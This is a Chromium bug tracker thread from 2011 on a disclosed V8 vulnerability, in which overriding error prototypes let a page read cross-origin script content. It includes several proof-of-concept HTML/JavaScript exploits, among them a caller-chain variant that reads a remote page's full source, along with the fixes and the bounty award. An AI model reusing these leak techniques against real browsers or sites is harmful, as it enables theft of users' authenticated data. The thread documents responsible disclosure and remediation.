# Error prototypes are called on remote scripts

| Field | Value |
|-------|-------|
| **Issue ID** | [40086786](https://issues.chromium.org/issues/40086786) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Unknown |
| **Reporter** | ev...@google.com |
| **Assignee** | ro...@chromium.org |
| **Created** | 2011-01-11 |
| **Bounty** | $1,337.00 |

## Description

**VULNERABILITY DETAILS**  

ReferenceError is called on remote scripts. this can leak sensitive information from the remote site.

**VERSION**  

Chrome Version: 10.0.628.0 dev  

Operating System: All

**REPRODUCTION CASE**

<script>ReferenceError.prototype.\_\_defineGetter\_\_('name', function(){
e=this;for(var j in e){if(j!='name')console.log(j,e[j])}
});</script>
<script src="http://jsbin.com/ujoho6/2"></script>

this will leak in the console "asdf" which is the content of the remote file

## Timeline

### ev...@google.com (2011-01-11)

See also: https://bugzilla.mozilla.org/show_bug.cgi?id=624621

### ev...@google.com (2011-01-11)

This was reported by Daniel Divricean

### sc...@gmail.com (2011-01-11)

Hey, nice bug!

@abarth -- seems like your area of expertise? :)

### sc...@gmail.com (2011-01-11)

Works on Chrome 8, BTW.

### ev...@google.com (2011-01-11)

And works on Safari and Opera as well.. 

As we all know, also works on IE:
http://scary.beasts.org/misc/reader.html

So.. works everywhere.

### sc...@gmail.com (2011-01-11)

The IE thing is simply the window.onerror handler which seems different from overriding the ReferenceError prototype.

### ev...@google.com (2011-01-11)

Opera is tracking this as DSK-325495

### ev...@google.com (2011-01-11)

yeah, I know on IE is different but you can steal the same thing :P

### sc...@gmail.com (2011-01-11)

On IE, it's different because it's been a live bug for years. This will be an interesting comparison of security response. I bet the other browser vendors fix it within weeks, not years.

### ab...@chromium.org (2011-01-11)

I haven't investigated, but I suspect this is a V8-internal issue.

@ager, thoughts?

### ag...@chromium.org (2011-01-11)

The scripts are running in the same context and therefore for reference errors they use the same constructor. V8 has no knowledge that the code loaded is from a different domain, only the browser knows that. There is no cross-frame access going on here so there is no same-domain policy checks. To me this looks like something that is working as intended?

Why is it a problem to be able to get to the contents of a publicly available file on the web? 

### sc...@gmail.com (2011-01-11)

@ager: the pastebin example is publicly available yes, but the security issue comes if that resource were cookie-authenticated. The browser will automatically send the cookie for the cross-origin request.

### ag...@chromium.org (2011-01-11)

I'm still not sure I understand. However, it is not a V8 internal issue. If the code should not be allowed to be executed in the current context, only the browser knows that. If the code is evaluated in V8 it will use the Reference error constructor so it needs to be blocked before it gets there.

### ab...@chromium.org (2011-01-11)

The code is allowed to run.  The problem is that the page isn't allowed to learn anything about it if it doesn't have proper JavaScript syntax.  If even if it does have proper JavaScript syntax, it still isn't supposed to learn various other esoteric things.

### ag...@chromium.org (2011-01-11)

If what is in the file is one big valid JavaScript identifier you will get "Reference Error: <large identifier> is not defined" even if you do not mess with the ReferenceError constructor. I guess JS engines can dumb down their error messages to not mention anything specific about the error (which would probably mean not mentioning anything specific about any type of error). Unfriendly to developers but I don't think there is any other way to block the reading of this if you cannot block it before it is passed to the VM.

### sc...@gmail.com (2011-01-11)

@ager: "dumbing down" the error message is exactly how Firefox fixed the window.onerror leak. The dumbing down is only done, however, if the script firing the error was loaded cross-origin relative to the current execution context.

Do we have that information available to us when constructing a reference error? Do we know where the errant script block was loaded from vs. the current execution origin?

### ab...@chromium.org (2011-01-11)

We certainly know where the script came from when we hand it to V8.  We could include that information.  Alternatively, we coule try to send this information to the error console without making it available to the page.

### ag...@chromium.org (2011-01-11)

Thinking about this some more I don't see how even "dumbing down" error messages would help. If you do resource tracking in the debugger you will be able to see the source for this script no matter what you do...

### sc...@gmail.com (2011-01-11)

@abarth: ah, the ReferenceError also gets constructed with the URL and line number too, so maybe the information is readily available:
"undefined: asdf is not defined
    at http://jsbin.com/ujoho6/2:2:1"

One note of extreme caution: Eduardo mentioned that FF leaks redirects whereas Chrome doesn't. So it's possible that the origin represented above is incorrect if it does not reflect the final target of any redirects.

If the spec permits us to omit the reference text, reference URL and reference line / character position from the ReferenceError -- that might be safest in the very short term! Anyone know what the spec mandates?

### ab...@chromium.org (2011-01-11)

> If you do resource tracking in the debugger you will be able to see the source for this script no matter what you do...

Do you mean the user can see the source code?  We're worried about what the enclosing page can learn about the script.

### ag...@chromium.org (2011-01-11)

Regarding the spec for ReferenceErrors: there is no spec other than 'throw ReferenceError'.

Adam, yes, I mean that the user can see the source code for anything passed to V8.

I'm still not sure I understand why this is an issue at all. If you can get access to the content of that file and you are authorized in the browser sense to do so, what prevents you from taking that contents, dumping it as text in an HTML element and reading it from there in JavaScript?

I'm sorry if I'm asking stupid questions. Just trying to understand the full picture.

### ab...@chromium.org (2011-01-11)

Think about it from the perspective of a malicious web site.  The web site is running in your browser and wants to read you email.  Suppose you use a web mail provide who's inbox is located at http://webmail.com/inbox.  Now, the malicious web site includes the following script tag:

<script src="http://webmail.com/inbox"></script>

They're allowed to do this according to the browser security policy, even though http://webmail.com/inbox isn't a JavaScript file at all.  Now, the JavaScript engine will try to parse the inbox and execute it, but it will likely fail.  In this case, imagine in fails with a ReferenceError where the identifier happens to be a word in the subject of your email, like AndroidTabletToBeReleasedFeburary31st.  Using the technique in https://crbug.com/chromium/69187#c0, the malicious web site can learn information about this ReferenceError and therefore learn things about your email that it's not supposed to know.

The issue is similar in spirit to JSON hijacking <http://haacked.com/archive/2009/06/25/json-hijacking.aspx>, but the target URL doesn't need to be JSON because we're learning information about it even though it has parse errors.

### ev...@google.com (2011-01-11)

cc'ing felix

### ev...@google.com (2011-01-11)

cc'ing daniel

### sc...@gmail.com (2011-01-11)

I like Adam's idea of making ReferenceError immutable (at least the prototype, if not the whole thing ;-) Do we need the same for the other *Error classes?

### ab...@chromium.org (2011-01-11)

I'm not sure exactly what we'd have to make immutable, but enough so that you couldn't trick the VM into calling guest code when these errors occur.

### ev...@google.com (2011-01-11)

cc'ing Adam and Michal, in the context of the VRP.

### ag...@chromium.org (2011-01-12)

Unfortunately, making the ReferenceError prototype immutable will not be enough. You need the whole thing as demonstrated by the example below. Making Object.prototype immutable would completely break JavaScript.

<script>
Object.prototype.__defineSetter__('arguments', function(v){
 console.log('arguments', v)
});
</script>
<script src="http://jsbin.com/ujoho6/2"></script>

I need to work with this for a bit. The real issue here is that our error creation code and formatting for the console is written in JavaScript. This means that getters and setters like these can be called making the error object available outside of the script tag which it should not be. I'll look into it some more and see what i can do. Careful rewriting of our JavaScript natives or rewriting in C++ seems to be needed.


### sc...@gmail.com (2011-01-12)

[Empty comment from Monorail migration]

### ev...@google.com (2011-01-12)

Hi ager!

Why is that triggering that call?

This for example isn't:

Object.prototype.__defineSetter__('arguments', function(v){
 console.log('arguments', v)
});
new ReferenceError("asdf")

Is it something specific on how this exception works?

Greetings!!

### ag...@chromium.org (2011-01-13)

The example in https://crbug.com/chromium/69187#c28 is specific to V8's implementation of these exceptions and I have a patch out to fix that part of this issue. Two issues remaining after that: the 'name' property on error prototypes can be overwritten (which is the original report) and the toString method can be overwritten and is called to format the message for the console. Will be looking into those next. 

### ag...@chromium.org (2011-01-14)

OK. I have reworked the error objects in V8 and I believe this is fixed with those changes. Changes are: 

1. Make sure that the properties on error objects themselves are always there which avoids calling accessors for them which can leak the error objects across script tags.
2. Make the 'name' property on error prototypes ReadOnly and DontDelete so it cannot be replaced with a getter that is called during error message formatting.
3. Make sure that error message formatting throuh the API for the console does not use overwritten toString methods on error objects.

These changes are in V8 bleeding_edge 6322. We will roll that into chromium on Monday if all goes well. I would appreciate if you could try this out and see if you can find a place where this still breaks. I think I have closed the holes but more eyes is always good.

The only incompatibility that I imagine from this is that people will modify the name of builtin errors. I don't think this will be a real issue but I would like to let this cook on Chrome 10 dev before merging to other places if needed.

### sc...@gmail.com (2011-01-15)

Awesome, thanks Mads!!

Eduardo is probably our most devious security guy in this space.

@evn - any chance you'd have a few minutes to play with this once it rolls into a Chrome build? We can probably get it to hit Windows canary pretty quick.

### di...@gmail.com (2011-01-19)

Here's another thought on how to get the error message with or without overriding ReferenceError. These should also be checked.

<html><head>
<script type="text/javascript">

var worker = new Worker("worker.js");
worker.onmessage = function(e){ alert(e.data) };
worker.onerror = function(e){ var msg = "", j; for (j in e) { msg += j+':'+e[j]+"\n";} alert(msg); };

</script></head><body></body></html>

--worker.js--
/*ReferenceError.prototype.__defineGetter__('name', function(){
	var msg = "", e=this, j; for (j in e) { if(j!='name') msg += j+':'+e[j]+"\n";} postMessage(msg);
});*/
importScripts("http://jsbin.com/afugi4/2");


### sc...@gmail.com (2011-01-20)

@divricean -- the worker.onerror / onmessage idea is a clever one.
I believe the HTML5 worker spec, for safety, states that importScripts() should only work for same-origin resources. That would prevent any such attack.

### sc...@gmail.com (2011-01-20)

@ager: thanks for quick fixes on this!
I think I've persuaded Eduardo to help us give this a thorough test. Unfortunately, today's dev channel has only v8 3.0.7 and not 3.0.8 so we'll have to wait for the next one for Eduardo :)

As well as not leaking the name of the undefined reference, are we also careful to not leak the line number of the error? That would also be considered a minor leak.

### sc...@gmail.com (2011-01-20)

This is a clever bug! -- despite being a Medium severity, the panel will consider it for reward.

### di...@gmail.com (2011-01-20)

@scarybeasts: Indeed, it seems that workers should work only for same-origin and that might be the fix. 
Forgot to mention that the worker issue occurs also on Firefox, Safari and Opera. 
Thanks.

### sc...@gmail.com (2011-01-20)

@divricean: and just to confirm, Chrome's OK in your testing too (for the worker case)?

### di...@gmail.com (2011-01-20)

@scarybeasts: I can reproduce the worker issue on Chrome 8.0.552.237 as well as on Chromium 10.0.645.0 (71995), both on Windows 7. 
So yes, Chrome also seems to ignore this same-origin spec for workers.

### sc...@gmail.com (2011-01-21)

Fix for the ReferenceError issue landed on Chromium trunk and looks good; it'll hit the next canary and dev channel releases, respectively.

Moving to WillMerge; we'll merge it to M9 at some stage, probably the first M9 patch.

@evn volunteered to do some additional testing on the next build :)

I will look at the Workers issue, and file new bug (cc: you) if necessary.

### ev...@google.com (2011-01-21)

Hey!

Sorry for the late response, I am not getting notified of responses to this bug :(

But yes, I'll review this, nice catch again David! FWIW, That should be tracked as a different bug, have you filed one?

Chris, please let me know when I can start attacking the patch :P

Greetz

### sc...@gmail.com (2011-01-21)

@divricean: reproduced the workers case. Separate bug to follow.
Looks like new Worker() has to be same-origin in the HTML5 spec, but importScripts() is allowed to load anything. Accordingly, the onerror callback must be careful!!

### sc...@gmail.com (2011-01-21)

The worker bug is being tracked in http://code.google.com/p/chromium/issues/detail?id=70336
We'll ship the fix to users at the same time as this ReferenceError bug.

@divricean: what name / affiliation / etc. would you like us to use for credit purposes for this bug?

### sc...@gmail.com (2011-01-22)

@evn: latest canary build, 10.0.645.0, has V8 3.0.9 with fix! :D

### di...@gmail.com (2011-01-22)

@scarybeasts: Daniel Divricean, with a link to http://divricean.ro if possible. Thank you.

### sc...@gmail.com (2011-01-22)

@divricean: no problem! You will also appear in the Chromium Hall of Fame, with link :)

### di...@gmail.com (2011-01-23)

I just tested the latest Chrome build 10.0.648.0 (72301) and the original test case does not reproduce anymore. Instead the following test case works just fine in getting the security token from cross-domain.

<html><head>
<script type="text/javascript">
window.onerror = function(e){
	alert(e);
};
</script>
<script src="http://jsbin.com/afugi4/2"></script>
</head><body></body></html>

I tested this test case also on Chrome 8.0.552.237, just to confirm, but it does not work there. As it didn't work back when the bug was first logged.

### sc...@gmail.com (2011-01-23)

@divricean: thanks!
Looks like I beat you to that last one: https://crbug.com/chromium/70337. It's already fixed on trunk so the next dev channel should be ok.
The reasons it's a regression since Chrome 8 is that the window.onerror feature in new in WebKit.

### di...@gmail.com (2011-01-23)

@scarybeasts: Nice. I see that you also beat me to the token issue, I wonder why the token issue was first addressed only with user-agent for IE.

But I still have another test case, it works on Chrome build 10.0.648.0 (72301) and on Chrome 8.0.552.237. Can you check if this is valid or maybe cc me if it's been fixed already :).

<html><head>

<script type="text/javascript">
ReferenceError.prototype.toString = Object.prototype.toString = function () {
	var msg = "", e=this, j; for (j in e) { msg += j+':'+e[j]+"\n";} alert(msg);
};
ReferenceError.prototype.constructor = null;
</script>
<script src="http://jsbin.com/afugi4/2"></script>

</head><body></body></html>


### sc...@gmail.com (2011-01-24)

@divricean: thanks for the variant. The v8 devs did mention toString() overrides as a possible additional vector. Maybe that was taken care of in a separate change, I will check.

(Quick/lazy online click: http://scary.beasts.org/misc/referr2.html)

### sc...@gmail.com (2011-01-24)

@divricean: Google Reader checks only for IE so as to avoid breaking mobile apps which may have hardcoded assumptions about the format of the token.
At the time of the added check, only the IE browser was known to have a problem.
I doubt Reader needs to change to check for additional user agents; unlike IE, the other browsers (e.g. Firefox, Chrome) seem to be taking this bug seriously and will undoubtedly have it fixed in a timeframe measured in weeks rather than years....

### ag...@chromium.org (2011-01-24)

Thanks for the new case. There are a couple of places where I missed the toString overwriting. Will fix. :)

### ag...@chromium.org (2011-01-24)

Fixed in bleeding_edge V8 r6435. This should be pushed to Chromium later today if all goes according to plan. Thanks again!

### sc...@gmail.com (2011-01-24)

[Empty comment from Monorail migration]

### di...@gmail.com (2011-01-24)

@ager: np. I've seen the new fix but I could not verify it yet on Chromium 10.0.649.0 (72381). 
Instead I have another variant for this and I thought maybe you can verify it before the fix goes into Chromium.
<html><head>

<script type="text/javascript">
ReferenceError.prototype.__proto__ = new Object();
ReferenceError.prototype.toString = Object.prototype.toString = function () {
	var msg = "", e=this, j; for (j in e) { msg += j+':'+e[j]+"\n";} alert(msg);
};
ReferenceError.prototype.constructor = null;
</script>
<script src="http://jsbin.com/afugi4/2"></script>

</head><body></body></html>


### ag...@chromium.org (2011-01-25)

Argh, this is a can of worms. Thanks! :)

I'm using "instanceof Error" which you can break by overwriting the implicit prototype of the ReferenceError prototype the way your example does. However, the ReferenceError (and other internal error) prototypes themselves cannot be overwritten so I need to expand the testing to the concrete internal error types.

### ag...@chromium.org (2011-01-25)

Well, no, it is even worse. If you do this you effectively remove the error toString method and just get the Object.prototype.toString method which I didn't consider.

### ag...@chromium.org (2011-01-25)

I'm confusing myself. We don't use that toString method when formatting error messages through the API. We only use it if you actually get a hold of the error object. So fixing the instanceof check will indeed fix this problem.

I'm cooking up a patch.

### ag...@chromium.org (2011-01-25)

Another fix landed. Thanks again.

### di...@gmail.com (2011-01-25)

Can of worms indeed :) 
The following case looks pretty serious, one can access entire content of remote files (scripts, html, ...). The caller thing might be a different bug.

It reproduces on Chrome 8.0.552.237 and on Chromium 10.0.650.0 (72549). Could you verify?

<html><head>

<script type="text/javascript">
SyntaxError.prototype.constructor = new Object();
SyntaxError.prototype.constructor.name = 1;
Number.prototype.toString = function () {
	var _caller = this.toString.caller;
	while (_caller.name !== "FormatMessage") {
		_caller = _caller.caller;
	}
	alert(_caller.arguments[0].script.source);
}
SyntaxError.prototype.toString = Object.prototype.toString;
</script>
<script src="http://google.com"></script>

</head><body></body></html>


### sc...@gmail.com (2011-01-25)

@divricean: whoa!!! That last one is pretty awesome. It still fires with V8 3.0.11 (I just built a custom Chromium against V8 trunk@r6470 and I can reproduce).
Could you file this latest one as a separate bug, since the impact is very different? We can then also consider that separate bug for an additional reward! :)
On the subject of rewards, I have some news on the panel's decision on these ReferenceError leaks, coming up soon....

### sc...@gmail.com (2011-01-25)

@divricean - congratulations! This bug (specifically the name leaks on the ReferenceError object) qualifies for a provisional $1337 Chromium Security Reward!
I don't think we've ever rewarded at the $1337 for a SecSeverity-Medium before, but in this case there are exceptional circumstances:
- The panel found the bug to be particularly clever.
- You were extremely helpful and fun to work with -- providing no less than 3 variants.
- The repros were simple, clear, and showed the problem well.

The other bugs (workers, and UXSS in SyntaxError) will be considered separately for reward.

Thanks again for the great research.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-01-26)

Split off the UXSS bug into http://code.google.com/p/chromium/issues/detail?id=70877
Thanks Daniel.

### di...@gmail.com (2011-01-26)

Thank you, it's been great working with such a responsive team.
(Sorry about not filing the caller bug, I was asleep - different timezones :) )

### le...@chromium.org (2011-02-02)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-02-02)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-02-14)

This fix will go out with Chrome 10, due early March.

### sc...@gmail.com (2011-03-02)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-03-15)

Invoice finalized; payment is in e-payment system.

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### ro...@chromium.org (2012-04-24)

I am reopening this bug, because I discovered that part of the solution Mads implemented (making *Error.prototype.name readonly) is going to break the web. The only reason this hasn't shown up yet is because it has been masked by another, long-standing V8 bug, namely its failure to respect readonly-ness of inherited properties (that is, it incorrectly allows assignment to create a new property on an object that is already readonly on its prototype).

I'm about to fix the latter, so I have to find another, more targeted solution for the security issue. I'd like to run the following suggestion by you: instead of _forbidding_ modifications of *E.p.name, we just _ignore_ them in the right places.

More concretely:

1. Make *Error.prototype.name writable and configurable as required.
2. But in Error.prototype.toString, if
  a) 'this' does not have an own 'name' property, and
  b) its __proto__.name is a JS accessor property,
  then don't invoke this.name but default to the respective class name.
3. And while we're at it, ensure that .message is not accessed either.

Would that be sufficient to deal with potential leakage? Also, would it be enough to only apply this hack in the case of ReferenceError, TypeError, and SyntaxError instances?


### js...@chromium.org (2012-04-24)

Please open a new bug for the functional issue. Reopening a security bug means the vulnerability was not addressed (which is not the case here).

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-11)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/69187?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40086786)*
